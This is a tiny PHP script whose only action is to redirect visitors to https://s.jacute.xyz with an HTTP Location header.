<?php
header("Location:https://s.jacute.xyz");
?>